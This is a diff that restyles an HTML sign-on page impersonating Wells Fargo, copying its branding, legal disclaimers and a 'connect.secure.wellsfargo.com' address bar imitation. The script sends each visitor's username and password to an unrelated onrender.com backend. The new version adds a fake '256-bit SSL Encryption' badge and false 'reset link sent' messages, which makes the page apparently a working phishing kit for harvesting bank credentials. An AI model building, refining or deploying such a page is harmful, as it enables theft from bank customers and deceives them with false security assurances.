@@ -3,221 +3,896 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Wells Fargo Sign On</title>
+  <title>Sign On | Wells Fargo</title>
+  <link rel="icon" href="logo.png" type="image/png" />
   <style>
-    body {
+    :root {
+      --primary: #b31b1b;
+      --primary-light: #dc2626;
+      --primary-dark: #8f1515;
+      --secondary: #003366;
+      --bg-color: #f8f9fa;
+      --card-bg: #ffffff;
+      --text-color: #111827;
+      --text-secondary: #6b7280;
+      --border-color: #e5e7eb;
+      --success: #15803d;
+      --warning: #d97706;
+      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+      --shadow-lg: 0 20px 40px rgba(0, 0, 0, 0.15);
+    }
+
+    * {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: #fff;
-      color: #000;
-    }
-    header {
-      background-color: #b31b1b;
-      color: #fff;
-      padding: 12px;
-      text-align: center;
-      font-weight: bold;
-    }
-    main {
-      max-width: 400px;
-      margin: 0 auto;
-      padding: 20px;
-    }
-    h2 {
-      font-size: 20px;
-      text-align: center;
-      margin: 20px 0;
-    }
-    .input-group {
-      margin-bottom: 15px;
-      position: relative;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 14px;
-      font-size: 16px;
-      border: 1px solid #aaa;
-      border-radius: 6px;
+      padding: 0;
       box-sizing: border-box;
     }
-    .input-group .show-link {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 14px;
-      color: #3f51b5;
-      cursor: pointer;
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #f8f9fa 0%, #e5e7eb 100%);
+      color: var(--text-color);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
-    .checkbox {
+
+    /* Header */
+    header {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+      color: white;
+      padding: 16px 24px;
       display: flex;
       align-items: center;
-      margin: 10px 0 20px;
+      justify-content: space-between;
     }
-    .checkbox input {
-      transform: scale(1.2);
-      margin-right: 8px;
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
     }
-    .checkbox label {
+
+    .logo img {
+      height: 40px;
+      filter: brightness(0) invert(1);
+    }
+
+    .logo-text {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+
+    .header-links {
+      display: flex;
+      gap: 20px;
+    }
+
+    .header-links a {
+      color: white;
+      text-decoration: none;
       font-size: 14px;
+      font-weight: 600;
+      padding: 8px 16px;
+      border-radius: 20px;
+      transition: all 0.3s;
+      background: rgba(255,255,255,0.1);
     }
-    .sign-on-btn {
-      width: 100%;
-      padding: 14px;
-      background: #ccc;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      color: #555;
-      cursor: not-allowed;
+
+    .header-links a:hover {
+      background: rgba(255,255,255,0.2);
     }
-    .passkey-btn {
+
+    .header-links a.primary {
+      background: white;
+      color: var(--primary);
+    }
+
+    /* Main Container */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .login-container {
       width: 100%;
+      max-width: 440px;
+    }
+
+    /* Greeting Card */
+    .greeting-card {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .time-greeting {
+      font-size: 14px;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .welcome-title {
+      font-size: 32px;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    /* Login Card */
+    .login-card {
+      background: var(--card-bg);
+      border-radius: 24px;
+      padding: 40px;
+      box-shadow: var(--shadow-lg);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .login-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-light) 100%);
+    }
+
+    /* Security Badge */
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
       padding: 12px;
-      border: 1px solid #333;
-      border-radius: 6px;
-      background: #fff;
+      background: rgba(37, 99, 235, 0.05);
+      border-radius: 12px;
+      font-size: 13px;
+      color: var(--secondary);
+      font-weight: 600;
+    }
+
+    /* Form Elements */
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--text-color);
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 16px 48px 16px 48px;
+      border: 2px solid var(--border-color);
+      border-radius: 12px;
       font-size: 16px;
-      margin-top: 10px;
+      transition: all 0.3s;
+      background: var(--bg-color);
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(179, 27, 27, 0.1);
+    }
+
+    .form-input.error {
+      border-color: #ef4444;
+      background: #fef2f2;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      color: var(--text-secondary);
+    }
+
+    .input-action {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: var(--primary);
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: all 0.3s;
+    }
+
+    .input-action:hover {
+      background: rgba(179, 27, 27, 0.1);
+    }
+
+    /* Remember Me */
+    .remember-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+
+    .checkbox-wrapper {
+      display: flex;
+      align-items: center;
+      gap: 10px;
       cursor: pointer;
     }
-    .forgot-link {
-      text-align: center;
-      margin: 15px 0;
+
+    .checkbox-wrapper input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: var(--primary);
+      cursor: pointer;
+    }
+
+    .checkbox-wrapper label {
       font-size: 14px;
+      color: var(--text-color);
+      cursor: pointer;
+      font-weight: 500;
     }
-    .forgot-link a {
-      color: #3f51b5;
+
+    .forgot-link {
+      font-size: 14px;
+      color: var(--primary);
+      font-weight: 700;
       text-decoration: none;
+      transition: all 0.3s;
     }
-    footer {
-      max-width: 500px;
-      margin: 30px auto;
-      padding: 10px;
-      font-size: 12px;
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Sign On Button */
+    .sign-on-btn {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 17px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .sign-on-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(179, 27, 27, 0.35);
+    }
+
+    .sign-on-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .sign-on-btn.processing {
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+
+    /* Divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 24px 0;
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border-color);
+    }
+
+    .divider span {
+      padding: 0 16px;
+    }
+
+    /* Alternative Sign On Methods */
+    .alt-methods {
+      display: grid;
+      gap: 12px;
+    }
+
+    .alt-btn {
+      width: 100%;
+      padding: 14px;
+      background: var(--bg-color);
+      border: 2px solid var(--border-color);
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .alt-btn:hover {
+      border-color: var(--primary);
+      color: var(--primary);
+      background: rgba(179, 27, 27, 0.03);
+    }
+
+    .alt-btn.faceid {
+      background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+      color: white;
+      border: none;
+    }
+
+    .alt-btn.faceid:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+
+    /* Enroll Section */
+    .enroll-section {
       text-align: center;
-      color: #555;
+      margin-top: 24px;
+      padding-top: 24px;
+      border-top: 1px solid var(--border-color);
+    }
+
+    .enroll-text {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 12px;
+    }
+
+    .enroll-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 24px;
+      background: white;
+      border: 2px solid var(--primary);
+      color: var(--primary);
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      text-decoration: none;
+      transition: all 0.3s;
+    }
+
+    .enroll-btn:hover {
+      background: var(--primary);
+      color: white;
+      transform: translateY(-2px);
+    }
+
+    /* Help Card */
+    .help-card {
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 24px;
+      margin-top: 24px;
+      box-shadow: var(--shadow);
+    }
+
+    .help-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .help-links {
+      display: grid;
+      gap: 12px;
+    }
+
+    .help-link {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px;
+      background: var(--bg-color);
+      border-radius: 10px;
+      text-decoration: none;
+      color: var(--text-color);
+      font-size: 14px;
+      font-weight: 600;
+      transition: all 0.3s;
+    }
+
+    .help-link:hover {
+      background: rgba(179, 27, 27, 0.05);
+      transform: translateX(4px);
+    }
+
+    .help-icon {
+      width: 36px;
+      height: 36px;
+      background: rgba(179, 27, 27, 0.1);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+    }
+
+    /* Footer */
+    footer {
+      background: var(--secondary);
+      color: white;
+      padding: 32px 24px;
+    }
+
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .disclaimer {
+      background: rgba(255,255,255,0.1);
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 24px;
+    }
+
+    .disclaimer h4 {
+      font-size: 13px;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .disclaimer ul {
+      list-style: none;
+      font-size: 12px;
+      line-height: 1.8;
+      opacity: 0.9;
+    }
+
+    .disclaimer li::before {
+      content: "• ";
+      color: #fbbf24;
+      font-weight: bold;
+      margin-right: 8px;
+    }
+
+    .footer-bottom {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      padding-top: 24px;
+      border-top: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    .footer-links a {
+      color: rgba(255,255,255,0.8);
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 600;
+      transition: all 0.3s;
+    }
+
+    .footer-links a:hover {
+      color: white;
+    }
+
+    .footer-copyright {
+      font-size: 12px;
+      opacity: 0.7;
+    }
+
+    .security-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.15);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      top: 80px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-100px);
+      background: #1f2937;
+      color: white;
+      padding: 16px 32px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      opacity: 0;
+      transition: all 0.3s;
+      z-index: 1000;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+
+    .toast.error {
+      background: #b91c1c;
+    }
+
+    /* Responsive */
+    @media (max-width: 600px) {
+      .header-links {
+        display: none;
+      }
+      
+      .login-card {
+        padding: 28px;
+      }
+      
+      .welcome-title {
+        font-size: 24px;
+      }
     }
   </style>
 </head>
 <body>
   <header>
-    WELLS FARGO
+    <div class="logo">
+      <img src="logo.png" alt="Wells Fargo" />
+      <span class="logo-text">WELLS FARGO</span>
+    </div>
+    <div class="header-links">
+      <a href="#">Locations</a>
+      <a href="#">Español</a>
+      <a href="enroll.html" class="primary">Enroll</a>
+    </div>
   </header>
 
   <main>
-    <h2>Good morning</h2>
-    <form id="login-form">
-      <div class="input-group">
-        <input type="text" id="username" placeholder="Username" required />
+    <div class="login-container">
+      <!-- Greeting -->
+      <div class="greeting-card">
+        <div class="time-greeting" id="timeGreeting">Good morning</div>
+        <h1 class="welcome-title">Welcome back</h1>
       </div>
-      <div class="input-group">
-        <input type="password" id="password" placeholder="Password" required />
-        <span class="show-link" id="togglePassword">Show</span>
+
+      <!-- Login Card -->
+      <div class="login-card">
+        <div class="security-badge">
+          🔒 Secure Connection • 256-bit SSL Encryption
+        </div>
+
+        <form id="login-form">
+          <div class="form-group">
+            <label class="form-label">Username or Email</label>
+            <div class="input-wrapper">
+              <span class="input-icon">👤</span>
+              <input 
+                type="text" 
+                class="form-input" 
+                id="username" 
+                placeholder="Enter your username"
+                autocomplete="username"
+                required
+              />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Password</label>
+            <div class="input-wrapper">
+              <span class="input-icon">🔑</span>
+              <input 
+                type="password" 
+                class="form-input" 
+                id="password" 
+                placeholder="Enter your password"
+                autocomplete="current-password"
+                required
+              />
+              <button type="button" class="input-action" id="togglePassword">Show</button>
+            </div>
+          </div>
+
+          <div class="remember-row">
+            <div class="checkbox-wrapper">
+              <input type="checkbox" id="saveUsername" />
+              <label for="saveUsername">Save username</label>
+            </div>
+            <a href="#" class="forgot-link" onclick="showForgot()">Forgot password?</a>
+          </div>
+
+          <button type="submit" class="sign-on-btn" id="signOnBtn">
+            Sign On →
+          </button>
+        </form>
+
+        <div class="divider">
+          <span>OR</span>
+        </div>
+
+        <div class="alt-methods">
+          <button class="alt-btn faceid" onclick="useBiometric()">
+            🔐 Sign on with Face ID / Touch ID
+          </button>
+          <button class="alt-btn" onclick="usePasskey()">
+            🔑 Use a passkey
+          </button>
+        </div>
+
+        <div class="enroll-section">
+          <p class="enroll-text">New to Wells Fargo?</p>
+          <a href="enroll.html" class="enroll-btn">
+            ✨ Open an account
+          </a>
+        </div>
       </div>
-      <div class="checkbox">
-        <input type="checkbox" id="save-username" />
-        <label for="save-username">Save username</label>
+
+      <!-- Help Card -->
+      <div class="help-card">
+        <h3 class="help-title">❓ Need help signing on?</h3>
+        <div class="help-links">
+          <a href="#" class="help-link" onclick="showHelp('username')">
+            <div class="help-icon">👤</div>
+            <span>Forgot username</span>
+          </a>
+          <a href="#" class="help-link" onclick="showHelp('password')">
+            <div class="help-icon">🔑</div>
+            <span>Forgot password</span>
+          </a>
+          <a href="#" class="help-link" onclick="showHelp('locked')">
+            <div class="help-icon">🔒</div>
+            <span>Account locked?</span>
+          </a>
+        </div>
       </div>
-      <button type="button" id="signOnBtn" class="sign-on-btn" disabled>Sign on</button>
-      <button type="button" class="passkey-btn">Use a passkey</button>
-      <div class="forgot-link">
-        <a href="#">Forgot username or password?</a>
-      </div>
-    </form>
+    </div>
   </main>
 
-  <footer style="background: #f6f4f1; color: #333; font-size: 14px; padding: 20px; border-top: 1px solid #ccc;">
-  <div style="max-width: 1200px; margin: auto;">
-    <div style="margin-bottom: 15px;">
-      <p><strong>Investment and Insurance Products are:</strong></p>
-      <ul style="list-style: disc; padding-left: 20px; margin: 0;">
-        <li>Not Insured by the FDIC or Any Federal Government Agency</li>
-        <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
-        <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
-      </ul>
+  <!-- Footer -->
+  <footer>
+    <div class="footer-content">
+      <div class="disclaimer">
+        <h4>Investment and Insurance Products are:</h4>
+        <ul>
+          <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+          <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+          <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+        </ul>
+      </div>
+
+      <div class="footer-bottom">
+        <div class="footer-links">
+          <a href="#">About Wells Fargo</a>
+          <a href="#">Report Email Fraud</a>
+          <a href="#">Online Access Agreement</a>
+          <a href="#">Security Center</a>
+          <a href="#">Privacy & Cookies</a>
+          <a href="#">Sitemap</a>
+        </div>
+        <div class="security-indicator">
+          🔒 connect.secure.wellsfargo.com
+        </div>
+      </div>
+
+      <p class="footer-copyright" style="margin-top: 16px;">
+        © 1999 - 2025 Wells Fargo. All rights reserved. NMLSR ID 399801 • Equal Housing Lender
+      </p>
     </div>
-    <p style="margin-top: 15px;">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</p>
-    <hr style="border: none; border-top: 1px solid #ddd; margin: 20px 0;">
-    <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
-      <a href="#" style="color: #333; text-decoration: none;">About Wells Fargo</a>
-      <a href="#" style="color: #333; text-decoration: none;">Report Email Fraud</a>
-      <a href="#" style="color: #333; text-decoration: none;">Online Access Agreement</a>
-      <a href="#" style="color: #333; text-decoration: none;">Security Center</a>
-      <a href="#" style="color: #333; text-decoration: none;">Privacy, Cookies, Security & Legal</a>
-      <a href="#" style="color: #333; text-decoration: none;">Sitemap</a>
-      <a href="#" style="color: #333; text-decoration: none;">Do not sell or share my personal information</a>
-      <a href="#" style="color: #333; text-decoration: none;">Give Us Feedback</a>
-      <a href="#" style="color: #333; text-decoration: none;">Notice of Data Collection</a>
-    </div>
-    <p style="margin: 0;">© 1999 - 2025 Wells Fargo. All rights reserved. NMLSR ID 399801</p>
-    <div style="margin-top: 10px; font-size: 12px; color: #666;">
-      <span style="display: inline-block; background: #fbe9eb; padding: 5px 10px; border-radius: 4px;">
-        🔒 connect.secure.wellsfargo.com
-      </span>
-    </div>
-  </div>
-</footer>
+  </footer>
+
+  <!-- Toast -->
+  <div class="toast" id="toast"></div>
 
   <script>
-    // Show/hide password
-    const togglePassword = document.getElementById("togglePassword");
-    const passwordInput = document.getElementById("password");
-    togglePassword.addEventListener("click", () => {
-      if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-        togglePassword.textContent = "Hide";
-      } else {
-        passwordInput.type = "password";
-        togglePassword.textContent = "Show";
-      }
+    const BASE_URL = 'https://backend15-nnmy.onrender.com';
+
+    // Initialize
+    document.addEventListener('DOMContentLoaded', () => {
+      updateGreeting();
+      checkSavedUsername();
+      setupEventListeners();
     });
 
-    // Enable sign on button when fields filled
-    const signOnBtn = document.getElementById("signOnBtn");
-    const usernameInput = document.getElementById("username");
+    // Dynamic greeting based on time
+    function updateGreeting() {
+      const hour = new Date().getHours();
+      let greeting = 'Good evening';
+      if (hour < 12) greeting = 'Good morning';
+      else if (hour < 17) greeting = 'Good afternoon';
+      document.getElementById('timeGreeting').textContent = greeting;
+    }
 
-    function checkFields() {
-      if (usernameInput.value.trim() && passwordInput.value.trim()) {
-        signOnBtn.disabled = false;
-        signOnBtn.style.background = "#b31b1b";
-        signOnBtn.style.color = "white";
-        signOnBtn.style.cursor = "pointer";
-      } else {
-        signOnBtn.disabled = true;
-        signOnBtn.style.background = "#ccc";
-        signOnBtn.style.color = "#555";
-        signOnBtn.style.cursor = "not-allowed";
+    // Check for saved username
+    function checkSavedUsername() {
+      const saved = localStorage.getItem('savedUsername');
+      if (saved) {
+        document.getElementById('username').value = saved;
+        document.getElementById('saveUsername').checked = true;
       }
     }
 
-    usernameInput.addEventListener("input", checkFields);
-    passwordInput.addEventListener("input", checkFields);
+    // Event Listeners
+    function setupEventListeners() {
+      // Password toggle
+      const toggleBtn = document.getElementById('togglePassword');
+      const passwordInput = document.getElementById('password');
+      
+      toggleBtn.addEventListener('click', () => {
+        const isPassword = passwordInput.type === 'password';
+        passwordInput.type = isPassword ? 'text' : 'password';
+        toggleBtn.textContent = isPassword ? 'Hide' : 'Show';
+      });
 
-    // Handle sign on
-    signOnBtn.addEventListener("click", async () => {
-      const email = usernameInput.value;
-      const password = passwordInput.value;
+      // Form submission
+      document.getElementById('login-form').addEventListener('submit', handleLogin);
+    }
+
+    // Login Handler
+    async function handleLogin(e) {
+      e.preventDefault();
+      
+      const btn = document.getElementById('signOnBtn');
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const saveUsername = document.getElementById('saveUsername').checked;
+
+      // Validation
+      if (!username || !password) {
+        showToast('Please enter both username and password', true);
+        return;
+      }
+
+      // Update button state
+      btn.disabled = true;
+      btn.classList.add('processing');
+      btn.innerHTML = 'Signing on...';
+
+      // Save username if checked
+      if (saveUsername) {
+        localStorage.setItem('savedUsername', username);
+      } else {
+        localStorage.removeItem('savedUsername');
+      }
 
       try {
-        const res = await fetch('https://backend15-nnmy.onrender.com/api/auth/login', {
+        const res = await fetch(`${BASE_URL}/api/auth/login`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, password })
+          body: JSON.stringify({ email: username, password })
         });
+
         const data = await res.json();
+
         if (res.ok && data.token) {
+          // Success
           localStorage.setItem('userToken', data.token);
-          window.location.href = 'dashboard.html';
+          localStorage.setItem('userName', data.name || username);
+          
+          btn.innerHTML = '✓ Success!';
+          showToast('Welcome back! Redirecting...');
+          
+          setTimeout(() => {
+            window.location.href = 'dashboard.html';
+          }, 1000);
         } else {
-          alert(data.error || 'Login failed.');
+          // Error
+          throw new Error(data.error || 'Invalid credentials');
         }
       } catch (err) {
-        console.error('Login error:', err);
-        alert('Network error. Please try again.');
+        btn.disabled = false;
+        btn.classList.remove('processing');
+        btn.innerHTML = 'Sign On →';
+        
+        // Shake animation for error
+        const card = document.querySelector('.login-card');
+        card.style.animation = 'shake 0.5s ease-in-out';
+        setTimeout(() => card.style.animation = '', 500);
+        
+        showToast(err.message || 'Login failed. Please try again.', true);
+        
+        // Clear password
+        document.getElementById('password').value = '';
+        document.getElementById('password').focus();
       }
-    });
+    }
+
+    // Alternative Sign On Methods
+    function useBiometric() {
+      showToast('🔐 Face ID / Touch ID coming soon!');
+    }
+
+    function usePasskey() {
+      showToast('🔑 Passkey authentication coming soon!');
+    }
+
+    // Help Functions
+    function showForgot() {
+      showToast('📧 Password reset link sent to your email');
+    }
+
+    function showHelp(type) {
+      const messages = {
+        username: '📧 Username recovery sent to your email',
+        password: '🔑 Password reset instructions sent',
+        locked: '🔓 Contact support: 1-800-869-3557'
+      };
+      showToast(messages[type]);
+    }
+
+    // Toast Notification
+    function showToast(message, isError = false) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = 'toast show' + (isError ? ' error' : '');
+      
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    // Shake animation for errors
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-10px); }
+        75% { transform: translateX(10px); }
+      }
+    `;
+    document.head.appendChild(style);
   </script>
 </body>
 </html>
